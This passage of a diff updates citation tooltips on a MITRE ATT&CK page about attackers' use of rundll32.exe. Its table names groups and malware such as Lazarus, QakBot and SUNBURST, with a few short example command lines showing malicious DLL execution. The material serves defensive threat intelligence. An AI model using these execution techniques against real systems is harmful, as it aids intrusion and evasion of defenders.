href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/?hilite=%27Operation%27%2C%27North%27%2C%27Star%27" target="_blank" data-hasqtip="75" aria-describedby="qtip-75">[76]</a></sup></span></p>
+                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0022">Operation Dream Job</a>, <a href="/versions/v14/groups/G0032">Lazarus Group</a> executed malware with <code>C:\\windows\system32\rundll32.exe "C:\ProgramData\ThumbNail\thumbnail.db"</code>, <code>CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905</code>.<span onclick=scrollToRef('scite-74') id="scite-ref-74-a" class="scite-citeref-number" title="ClearSky Research Team. (2020, August 13). Operation 'Dream Job' Widespread North Korean Espionage Campaign. Retrieved December 20, 2021."data-reference="ClearSky Lazarus Aug 2020"><sup><a href="https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf" target="_blank" data-hasqtip="73" aria-describedby="qtip-73">[74]</a></sup></span><span onclick=scrollToRef('scite-75') id="scite-ref-75-a" class="scite-citeref-number" title="Breitenbacher, D and Osis, K. (2020, June 17). OPERATION IN(TER)CEPTION: Targeted Attacks Against European Aerospace and Military Companies. Retrieved December 20, 2021."data-reference="ESET Lazarus Jun 2020"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf" target="_blank" data-hasqtip="74" aria-describedby="qtip-74">[75]</a></sup></span><span onclick=scrollToRef('scite-76') id="scite-ref-76-a" class="scite-citeref-number" title="Cashman, M. (2020, July 29). Operation North Star Campaign. Retrieved December 20, 2021."data-reference="McAfee Lazarus Jul 2020"><sup><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/?hilite=%27Operation%27%2C%27North%27%2C%27Star%27" target="_blank" data-hasqtip="75" aria-describedby="qtip-75">[76]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1205,7 +1204,7 @@
                                                 <a href="/versions/v14/campaigns/C0005"> Operation Spalax </a>
                                             </td>
                                             <td>
-                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0005">Operation Spalax</a>, the threat actors used <code>rundll32.exe</code> to execute malicious installers.<span onclick=scrollToRef('scite-77') id="scite-ref-77-a" class="scite-citeref-number" data-reference="ESET Operation Spalax Jan 2021"><sup><a href="https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/" target="_blank" data-hasqtip="76" aria-describedby="qtip-76">[77]</a></sup></span></p>
+                                                            <p>During <a href="https://attack.mitre.org/campaigns/C0005">Operation Spalax</a>, the threat actors used <code>rundll32.exe</code> to execute malicious installers.<span onclick=scrollToRef('scite-77') id="scite-ref-77-a" class="scite-citeref-number" title="M. Porolli. (2021, January 21). Operation Spalax: Targeted malware attacks in Colombia. Retrieved September 16, 2022."data-reference="ESET Operation Spalax Jan 2021"><sup><a href="https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/" target="_blank" data-hasqtip="76" aria-describedby="qtip-76">[77]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1217,7 +1216,7 @@
                                                 <a href="/versions/v14/software/S1050"> PcShare </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S1050">PcShare</a> has used <code>rundll32.exe</code> for execution.<span onclick=scrollToRef('scite-50') id="scite-ref-50-a" class="scite-citeref-number" data-reference="Bitdefender FunnyDream Campaign November 2020"><sup><a href="https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf" target="_blank" data-hasqtip="49" aria-describedby="qtip-49">[50]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S1050">PcShare</a> has used <code>rundll32.exe</code> for execution.<span onclick=scrollToRef('scite-50') id="scite-ref-50-a" class="scite-citeref-number" title="Vrabie, V. (2020, November). Dissecting a Chinese APT Targeting South Eastern Asian Government Institutions. Retrieved September 19, 2022."data-reference="Bitdefender FunnyDream Campaign November 2020"><sup><a href="https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf" target="_blank" data-hasqtip="49" aria-describedby="qtip-49">[50]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1229,7 +1228,7 @@
                                                 <a href="/versions/v14/software/S0518"> PolyglotDuke </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0518">PolyglotDuke</a> can be executed using rundll32.exe.<span onclick=scrollToRef('scite-44') id="scite-ref-44-a" class="scite-citeref-number" data-reference="ESET Dukes October 2019"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf" target="_blank" data-hasqtip="43" aria-describedby="qtip-43">[44]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0518">PolyglotDuke</a> can be executed using rundll32.exe.<span onclick=scrollToRef('scite-44') id="scite-ref-44-a" class="scite-citeref-number" title="Faou, M., Tartare, M., Dupuy, T. (2019, October). OPERATION GHOST. Retrieved September 23, 2020."data-reference="ESET Dukes October 2019"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf" target="_blank" data-hasqtip="43" aria-describedby="qtip-43">[44]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1241,7 +1240,7 @@
                                                 <a href="/versions/v14/software/S0139"> PowerDuke </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0139">PowerDuke</a> uses rundll32.exe to load.<span onclick=scrollToRef('scite-78') id="scite-ref-78-a" class="scite-citeref-number" data-reference="Volexity PowerDuke November 2016"><sup><a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/" target="_blank" data-hasqtip="77" aria-describedby="qtip-77">[78]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0139">PowerDuke</a> uses rundll32.exe to load.<span onclick=scrollToRef('scite-78') id="scite-ref-78-a" class="scite-citeref-number" title="Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017."data-reference="Volexity PowerDuke November 2016"><sup><a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/" target="_blank" data-hasqtip="77" aria-describedby="qtip-77">[78]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1253,7 +1252,7 @@
                                                 <a href="/versions/v14/software/S0113"> Prikormka </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0113">Prikormka</a> uses rundll32.exe to load its DLL.<span onclick=scrollToRef('scite-79') id="scite-ref-79-a" class="scite-citeref-number" data-reference="ESET Operation Groundbait"><sup><a href="http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf" target="_blank" data-hasqtip="78" aria-describedby="qtip-78">[79]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0113">Prikormka</a> uses rundll32.exe to load its DLL.<span onclick=scrollToRef('scite-79') id="scite-ref-79-a" class="scite-citeref-number" title="Cherepanov, A.. (2016, May 17). Operation Groundbait: Analysis of a surveillance toolkit. Retrieved May 18, 2016."data-reference="ESET Operation Groundbait"><sup><a href="http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf" target="_blank" data-hasqtip="78" aria-describedby="qtip-78">[79]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1265,7 +1264,7 @@
                                                 <a href="/versions/v14/software/S0147"> Pteranodon </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0147">Pteranodon</a> executes functions using rundll32.exe.<span onclick=scrollToRef('scite-80') id="scite-ref-80-a" class="scite-citeref-number" data-reference="Palo Alto Gamaredon Feb 2017"><sup><a href="https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/" target="_blank" data-hasqtip="79" aria-describedby="qtip-79">[80]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0147">Pteranodon</a> executes functions using rundll32.exe.<span onclick=scrollToRef('scite-80') id="scite-ref-80-a" class="scite-citeref-number" title="Kasza, A. and Reichel, D. (2017, February 27). The Gamaredon Group Toolset Evolution. Retrieved March 1, 2017."data-reference="Palo Alto Gamaredon Feb 2017"><sup><a href="https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/" target="_blank" data-hasqtip="79" aria-describedby="qtip-79">[80]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1277,7 +1276,7 @@
                                                 <a href="/versions/v14/software/S0196"> PUNCHBUGGY </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0196">PUNCHBUGGY</a> can load a DLL using Rundll32.<span onclick=scrollToRef('scite-81') id="scite-ref-81-a" class="scite-citeref-number" data-reference="FireEye Know Your Enemy FIN8 Aug 2016"><sup><a href="https://www2.fireeye.com/WBNR-Know-Your-Enemy-UNC622-Spear-Phishing.html" target="_blank" data-hasqtip="80" aria-describedby="qtip-80">[81]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0196">PUNCHBUGGY</a> can load a DLL using Rundll32.<span onclick=scrollToRef('scite-81') id="scite-ref-81-a" class="scite-citeref-number" title="Elovitz, S. & Ahl, I. (2016, August 18). Know Your Enemy:  New Financially-Motivated & Spear-Phishing Group. Retrieved February 26, 2018."data-reference="FireEye Know Your Enemy FIN8 Aug 2016"><sup><a href="https://www2.fireeye.com/WBNR-Know-Your-Enemy-UNC622-Spear-Phishing.html" target="_blank" data-hasqtip="80" aria-describedby="qtip-80">[81]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1289,7 +1288,7 @@
                                                 <a href="/versions/v14/software/S0650"> QakBot </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0650">QakBot</a> has used Rundll32.exe to drop malicious DLLs including <a href="/versions/v14/software/S1063">Brute Ratel C4</a> and to enable C2 communication.<span onclick=scrollToRef('scite-82') id="scite-ref-82-a" class="scite-citeref-number" data-reference="Crowdstrike Qakbot October 2020"><sup><a href="https://www.crowdstrike.com/blog/duck-hunting-with-falcon-complete-qakbot-zip-based-campaign/" target="_blank" data-hasqtip="81" aria-describedby="qtip-81">[82]</a></sup></span><span onclick=scrollToRef('scite-83') id="scite-ref-83-a" class="scite-citeref-number" data-reference="Red Canary Qbot"><sup><a href="https://redcanary.com/threat-detection-report/threats/qbot/" target="_blank" data-hasqtip="82" aria-describedby="qtip-82">[83]</a></sup></span><span onclick=scrollToRef('scite-84') id="scite-ref-84-a" class="scite-citeref-number" data-reference="Cyberint Qakbot May 2021"><sup><a href="https://blog.cyberint.com/qakbot-banking-trojan" target="_blank" data-hasqtip="83" aria-describedby="qtip-83">[84]</a></sup></span><span onclick=scrollToRef('scite-85') id="scite-ref-85-a" class="scite-citeref-number" data-reference="ATT QakBot April 2021"><sup><a href="https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot" target="_blank" data-hasqtip="84" aria-describedby="qtip-84">[85]</a></sup></span><span onclick=scrollToRef('scite-33') id="scite-ref-33-a" class="scite-citeref-number" data-reference="Trend Micro Black Basta October 2022"><sup><a href="https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html" target="_blank" data-hasqtip="32" aria-describedby="qtip-32">[33]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0650">QakBot</a> has used Rundll32.exe to drop malicious DLLs including <a href="/versions/v14/software/S1063">Brute Ratel C4</a> and to enable C2 communication.<span onclick=scrollToRef('scite-82') id="scite-ref-82-a" class="scite-citeref-number" title="CS. (2020, October 7). Duck Hunting with Falcon Complete: A Fowl Banking Trojan Evolves, Part 2. Retrieved September 27, 2021."data-reference="Crowdstrike Qakbot October 2020"><sup><a href="https://www.crowdstrike.com/blog/duck-hunting-with-falcon-complete-qakbot-zip-based-campaign/" target="_blank" data-hasqtip="81" aria-describedby="qtip-81">[82]</a></sup></span><span onclick=scrollToRef('scite-83') id="scite-ref-83-a" class="scite-citeref-number" title="Rainey, K. (n.d.). Qbot. Retrieved September 27, 2021."data-reference="Red Canary Qbot"><sup><a href="https://redcanary.com/threat-detection-report/threats/qbot/" target="_blank" data-hasqtip="82" aria-describedby="qtip-82">[83]</a></sup></span><span onclick=scrollToRef('scite-84') id="scite-ref-84-a" class="scite-citeref-number" title="Cyberint. (2021, May 25). Qakbot Banking Trojan. Retrieved September 27, 2021."data-reference="Cyberint Qakbot May 2021"><sup><a href="https://blog.cyberint.com/qakbot-banking-trojan" target="_blank" data-hasqtip="83" aria-describedby="qtip-83">[84]</a></sup></span><span onclick=scrollToRef('scite-85') id="scite-ref-85-a" class="scite-citeref-number" title="Morrow, D. (2021, April 15). The rise of QakBot. Retrieved September 27, 2021."data-reference="ATT QakBot April 2021"><sup><a href="https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot" target="_blank" data-hasqtip="84" aria-describedby="qtip-84">[85]</a></sup></span><span onclick=scrollToRef('scite-33') id="scite-ref-33-a" class="scite-citeref-number" title="Kenefick, I. et al. (2022, October 12). Black Basta Ransomware Gang Infiltrates Networks via QAKBOT, Brute Ratel, and Cobalt Strike. Retrieved February 6, 2023."data-reference="Trend Micro Black Basta October 2022"><sup><a href="https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html" target="_blank" data-hasqtip="32" aria-describedby="qtip-32">[33]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1301,7 +1300,7 @@
                                                 <a href="/versions/v14/software/S0481"> Ragnar Locker </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0481">Ragnar Locker</a> has used rundll32.exe to execute components of VirtualBox.<span onclick=scrollToRef('scite-86') id="scite-ref-86-a" class="scite-citeref-number" data-reference="Sophos Ragnar May 2020"><sup><a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/" target="_blank" data-hasqtip="85" aria-describedby="qtip-85">[86]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0481">Ragnar Locker</a> has used rundll32.exe to execute components of VirtualBox.<span onclick=scrollToRef('scite-86') id="scite-ref-86-a" class="scite-citeref-number" title="SophosLabs. (2020, May 21). Ragnar Locker ransomware deploys virtual machine to dodge security. Retrieved June 29, 2020."data-reference="Sophos Ragnar May 2020"><sup><a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/" target="_blank" data-hasqtip="85" aria-describedby="qtip-85">[86]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1313,7 +1312,7 @@
                                                 <a href="/versions/v14/software/S0148"> RTM </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0148">RTM</a> runs its core DLL file using rundll32.exe.<span onclick=scrollToRef('scite-87') id="scite-ref-87-a" class="scite-citeref-number" data-reference="ESET RTM Feb 2017"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2017/02/Read-The-Manual.pdf" target="_blank" data-hasqtip="86" aria-describedby="qtip-86">[87]</a></sup></span><span onclick=scrollToRef('scite-88') id="scite-ref-88-a" class="scite-citeref-number" data-reference="Unit42 Redaman January 2019"><sup><a href="https://unit42.paloaltonetworks.com/russian-language-malspam-pushing-redaman-banking-malware/" target="_blank" data-hasqtip="87" aria-describedby="qtip-87">[88]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0148">RTM</a> runs its core DLL file using rundll32.exe.<span onclick=scrollToRef('scite-87') id="scite-ref-87-a" class="scite-citeref-number" title="Faou, M. and Boutin, J. (2017, February). Read The Manual: A Guide to the RTM Banking Trojan. Retrieved March 9, 2017."data-reference="ESET RTM Feb 2017"><sup><a href="https://www.welivesecurity.com/wp-content/uploads/2017/02/Read-The-Manual.pdf" target="_blank" data-hasqtip="86" aria-describedby="qtip-86">[87]</a></sup></span><span onclick=scrollToRef('scite-88') id="scite-ref-88-a" class="scite-citeref-number" title="Duncan, B., Harbison, M. (2019, January 23). Russian Language Malspam Pushing Redaman Banking Malware. Retrieved June 16, 2020."data-reference="Unit42 Redaman January 2019"><sup><a href="https://unit42.paloaltonetworks.com/russian-language-malspam-pushing-redaman-banking-malware/" target="_blank" data-hasqtip="87" aria-describedby="qtip-87">[88]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1325,7 +1324,7 @@
                                                 <a href="/versions/v14/software/S0074"> Sakula </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0074">Sakula</a> calls cmd.exe to run various DLL files via rundll32.<span onclick=scrollToRef('scite-89') id="scite-ref-89-a" class="scite-citeref-number" data-reference="Dell Sakula"><sup><a href="http://www.secureworks.com/cyber-threat-intelligence/threats/sakula-malware-family/" target="_blank" data-hasqtip="88" aria-describedby="qtip-88">[89]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0074">Sakula</a> calls cmd.exe to run various DLL files via rundll32.<span onclick=scrollToRef('scite-89') id="scite-ref-89-a" class="scite-citeref-number" title="Dell SecureWorks Counter Threat Unit Threat Intelligence. (2015, July 30). Sakula Malware Family. Retrieved January 26, 2016."data-reference="Dell Sakula"><sup><a href="http://www.secureworks.com/cyber-threat-intelligence/threats/sakula-malware-family/" target="_blank" data-hasqtip="88" aria-describedby="qtip-88">[89]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1337,7 +1336,7 @@
                                                 <a href="/versions/v14/groups/G0034"> Sandworm Team </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/groups/G0034">Sandworm Team</a> used a backdoor which could execute a supplied DLL using rundll32.exe.<span onclick=scrollToRef('scite-90') id="scite-ref-90-a" class="scite-citeref-number" data-reference="ESET Telebots July 2017"><sup><a href="https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/" target="_blank" data-hasqtip="89" aria-describedby="qtip-89">[90]</a></sup></span>    </p>
+                                                            <p><a href="/versions/v14/groups/G0034">Sandworm Team</a> used a backdoor which could execute a supplied DLL using rundll32.exe.<span onclick=scrollToRef('scite-90') id="scite-ref-90-a" class="scite-citeref-number" title="Cherepanov, A.. (2017, July 4). Analysis of TeleBots’ cunning backdoor . Retrieved June 11, 2020."data-reference="ESET Telebots July 2017"><sup><a href="https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/" target="_blank" data-hasqtip="89" aria-describedby="qtip-89">[90]</a></sup></span>    </p>
 
                                             </td>
                                         </tr>
@@ -1349,7 +1348,7 @@
                                                 <a href="/versions/v14/software/S0461"> SDBbot </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0461">SDBbot</a> has used rundll32.exe to execute DLLs.<span onclick=scrollToRef('scite-49') id="scite-ref-49-a" class="scite-citeref-number" data-reference="Korean FSI TA505 2020"><sup><a href="https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory=" target="_blank" data-hasqtip="48" aria-describedby="qtip-48">[49]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0461">SDBbot</a> has used rundll32.exe to execute DLLs.<span onclick=scrollToRef('scite-49') id="scite-ref-49-a" class="scite-citeref-number" title="Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022."data-reference="Korean FSI TA505 2020"><sup><a href="https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory=" target="_blank" data-hasqtip="48" aria-describedby="qtip-48">[49]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1361,7 +1360,7 @@
                                                 <a href="/versions/v14/software/S0382"> ServHelper </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0382">ServHelper</a> contains a module for downloading and executing DLLs that leverages <code>rundll32.exe</code>.<span onclick=scrollToRef('scite-91') id="scite-ref-91-a" class="scite-citeref-number" data-reference="Deep Instinct TA505 Apr 2019"><sup><a href="https://www.deepinstinct.com/2019/04/02/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload/" target="_blank" data-hasqtip="90" aria-describedby="qtip-90">[91]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0382">ServHelper</a> contains a module for downloading and executing DLLs that leverages <code>rundll32.exe</code>.<span onclick=scrollToRef('scite-91') id="scite-ref-91-a" class="scite-citeref-number" title="Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved May 28, 2019."data-reference="Deep Instinct TA505 Apr 2019"><sup><a href="https://www.deepinstinct.com/2019/04/02/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload/" target="_blank" data-hasqtip="90" aria-describedby="qtip-90">[91]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1373,7 +1372,7 @@
                                                 <a href="/versions/v14/software/S0589"> Sibot </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0589">Sibot</a> has executed downloaded DLLs with <code>rundll32.exe</code>.<span onclick=scrollToRef('scite-92') id="scite-ref-92-a" class="scite-citeref-number" data-reference="MSTIC NOBELIUM Mar 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/" target="_blank" data-hasqtip="91" aria-describedby="qtip-91">[92]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0589">Sibot</a> has executed downloaded DLLs with <code>rundll32.exe</code>.<span onclick=scrollToRef('scite-92') id="scite-ref-92-a" class="scite-citeref-number" title="Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence. Retrieved March 8, 2021."data-reference="MSTIC NOBELIUM Mar 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/" target="_blank" data-hasqtip="91" aria-describedby="qtip-91">[92]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1385,7 +1384,7 @@
                                                 <a href="/versions/v14/campaigns/C0024"> SolarWinds Compromise </a>
                                             </td>
                                             <td>
-                                                            <p>During the <a href="https://attack.mitre.org/campaigns/C0024">SolarWinds Compromise</a>, <a href="/versions/v14/groups/G0016">APT29</a> used <code>Rundll32.exe</code> to execute payloads.<span onclick=scrollToRef('scite-93') id="scite-ref-93-a" class="scite-citeref-number" data-reference="Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks"><sup><a href="https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/" target="_blank" data-hasqtip="92" aria-describedby="qtip-92">[93]</a></sup></span><span onclick=scrollToRef('scite-94') id="scite-ref-94-a" class="scite-citeref-number" data-reference="Microsoft Deep Dive Solorigate January 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/" target="_blank" data-hasqtip="93" aria-describedby="qtip-93">[94]</a></sup></span></p>
+                                                            <p>During the <a href="https://attack.mitre.org/campaigns/C0024">SolarWinds Compromise</a>, <a href="/versions/v14/groups/G0016">APT29</a> used <code>Rundll32.exe</code> to execute payloads.<span onclick=scrollToRef('scite-93') id="scite-ref-93-a" class="scite-citeref-number" title="MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 30, 2020."data-reference="Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks"><sup><a href="https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/" target="_blank" data-hasqtip="92" aria-describedby="qtip-92">[93]</a></sup></span><span onclick=scrollToRef('scite-94') id="scite-ref-94-a" class="scite-citeref-number" title="MSTIC, CDOC, 365 Defender Research Team. (2021, January 20). Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop . Retrieved January 22, 2021."data-reference="Microsoft Deep Dive Solorigate January 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/" target="_blank" data-hasqtip="93" aria-describedby="qtip-93">[94]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1397,7 +1396,7 @@
                                                 <a href="/versions/v14/software/S1030"> Squirrelwaffle </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S1030">Squirrelwaffle</a> has been executed using <code>rundll32.exe</code>.<span onclick=scrollToRef('scite-95') id="scite-ref-95-a" class="scite-citeref-number" data-reference="ZScaler Squirrelwaffle Sep 2021"><sup><a href="https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike" target="_blank" data-hasqtip="94" aria-describedby="qtip-94">[95]</a></sup></span><span onclick=scrollToRef('scite-96') id="scite-ref-96-a" class="scite-citeref-number" data-reference="Netskope Squirrelwaffle Oct 2021"><sup><a href="https://www.netskope.com/blog/squirrelwaffle-new-malware-loader-delivering-cobalt-strike-and-qakbot" target="_blank" data-hasqtip="95" aria-describedby="qtip-95">[96]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S1030">Squirrelwaffle</a> has been executed using <code>rundll32.exe</code>.<span onclick=scrollToRef('scite-95') id="scite-ref-95-a" class="scite-citeref-number" title="Kumar, A., Stone-Gross, Brett. (2021, September 28). Squirrelwaffle: New Loader Delivering Cobalt Strike. Retrieved August 9, 2022."data-reference="ZScaler Squirrelwaffle Sep 2021"><sup><a href="https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike" target="_blank" data-hasqtip="94" aria-describedby="qtip-94">[95]</a></sup></span><span onclick=scrollToRef('scite-96') id="scite-ref-96-a" class="scite-citeref-number" title="Palazolo, G. (2021, October 7). SquirrelWaffle: New Malware Loader Delivering Cobalt Strike and QakBot. Retrieved August 9, 2022."data-reference="Netskope Squirrelwaffle Oct 2021"><sup><a href="https://www.netskope.com/blog/squirrelwaffle-new-malware-loader-delivering-cobalt-strike-and-qakbot" target="_blank" data-hasqtip="95" aria-describedby="qtip-95">[96]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1409,7 +1408,7 @@
                                                 <a href="/versions/v14/software/S0142"> StreamEx </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0142">StreamEx</a> uses rundll32 to call an exported function.<span onclick=scrollToRef('scite-97') id="scite-ref-97-a" class="scite-citeref-number" data-reference="Cylance Shell Crew Feb 2017"><sup><a href="https://www.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar" target="_blank" data-hasqtip="96" aria-describedby="qtip-96">[97]</a></sup></span></p>
+                                                            <p><a href="/versions/v14/software/S0142">StreamEx</a> uses rundll32 to call an exported function.<span onclick=scrollToRef('scite-97') id="scite-ref-97-a" class="scite-citeref-number" title="Cylance SPEAR Team. (2017, February 9). Shell Crew Variants Continue to Fly Under Big AV’s Radar. Retrieved February 15, 2017."data-reference="Cylance Shell Crew Feb 2017"><sup><a href="https://www.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar" target="_blank" data-hasqtip="96" aria-describedby="qtip-96">[97]</a></sup></span></p>
 
                                             </td>
                                         </tr>
@@ -1421,7 +1420,7 @@
                                                 <a href="/versions/v14/software/S0559"> SUNBURST </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S0559">SUNBURST</a> used Rundll32 to execute payloads.<span onclick=scrollToRef('scite-94') id="scite-ref-94-a" class="scite-citeref-number" data-reference="Microsoft Deep Dive Solorigate January 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/" target="_blank" data-hasqtip="93" aria-describedby="qtip-93">[94]</a></sup></span> </p>
+                                                            <p><a href="/versions/v14/software/S0559">SUNBURST</a> used Rundll32 to execute payloads.<span onclick=scrollToRef('scite-94') id="scite-ref-94-a" class="scite-citeref-number" title="MSTIC, CDOC, 365 Defender Research Team. (2021, January 20). Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop . Retrieved January 22, 2021."data-reference="Microsoft Deep Dive Solorigate January 2021"><sup><a href="https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/" target="_blank" data-hasqtip="93" aria-describedby="qtip-93">[94]</a></sup></span> </p>
 
                                             </td>
                                         </tr>
@@ -1433,7 +1432,7 @@
                                                 <a href="/versions/v14/software/S1064"> SVCReady </a>
                                             </td>
                                             <td>
-                                                            <p><a href="/versions/v14/software/S1064">SVCReady</a> has used <code>rundll32.exe</code> for execution.<span onclick=scrollToRef('scite-98') id="scite-ref-98-a" class="scite-citeref-number" data-reference="HP SVCReady Jun 2022"><sup><a href="https://threatresearch.ext.hp.com/svcready-a-new-loader-reveals-itself/" target="_blank" data-hasqtip="97" aria-describedby="qtip-97">[98]</a></sup></span></p>
